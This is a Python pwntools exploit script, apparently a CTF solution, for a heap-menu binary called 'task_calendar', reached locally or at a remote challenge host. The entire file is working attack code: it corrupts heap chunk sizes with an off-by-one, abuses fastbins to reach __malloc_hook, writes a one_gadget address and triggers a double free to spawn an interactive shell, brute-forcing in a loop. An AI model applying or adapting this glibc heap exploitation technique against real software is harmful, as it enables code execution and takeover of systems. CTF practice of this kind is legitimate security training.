#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./task_calendar"
elf=ELF(pwn_file)
libc=elf.libc
r=None
pid=0
#heap_add=0
#stack_add=0
def getcc():
    global r
    global pid
    if len(sys.argv)==1:
        r=process(pwn_file)
        pid=r.pid
    else:
        r=remote("pwn.it",3333)
        pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()
def get_libbase():
    global r
    with open("/proc/%d/maps"%r.pid,"r") as f:
        data=f.read()
    lines=data.split("\n")
    libc_address=0
    for i in lines:
        if "libc" in i:
            libc_address=int(i[:i.find("-")],16)
            break
    return libc_address

def add(idx,size):
    r.sendlineafter(">","1")
    r.sendlineafter(">",str(idx+1))
    r.sendlineafter("> ",str(size))

def edit(idx,size,con):
    r.sendlineafter(">","2")
    r.sendlineafter(">",str(idx+1))
    r.sendlineafter("size> ",str(size))
    r.sendafter("info> ",con)

def dele(idx):
    r.sendlineafter(">","3")
    r.sendlineafter(">",str(idx+1))

def exp():
    global r
    getcc()
    #libc.address=get_libbase()
    libc.address=0x7f4d31b4b000
    r.sendafter(">","a"*0x41)
    add(0,0x60)
    add(0,0x30)
    add(0,0x18)
    add(1,0x68)
    add(2,0x68)
    add(3,0x68)
    f={
        0x10:p64(0)+p64(0x51)
    }
    edit(2,0x68,fit(f,filler="\x00")+"\n")
    edit(0,0x18,"a"*0x18+"\x91")
    dele(1)
    dele(2)
    dele(3)
    add(0,0x20)
    edit(3,1,"\n")
    f={
        0x28:p64(0x71),
        0x30:p64(libc.sym["__malloc_hook"]-0x13)[:2],
    }
    payload=fit(f,filler="\x00")
    edit(1,len(payload)-1,payload)
    add(0,0x68)
    add(0,0x68)
    add(0,0x68)
    f={
        0x28:p64(0x61),
        0x38:"\x00",
    }
    payload=fit(f,filler="\x00")
    edit(1,len(payload)-1,payload)
    add(3,0x58)
    f={
        0x3:p64(libc.address+0xf02a4)[:3]
    }
    payload=fit(f,filler="\x00")
    edit(0,len(payload)-1,payload)
    dele(2)
    dele(2)
    r.clean()
    r.sendline("pwd")
    data=r.recvline
    r.interactive()
    return True

while True:
    try:
        exp()
        break
    except Exception as e:
        r.close()

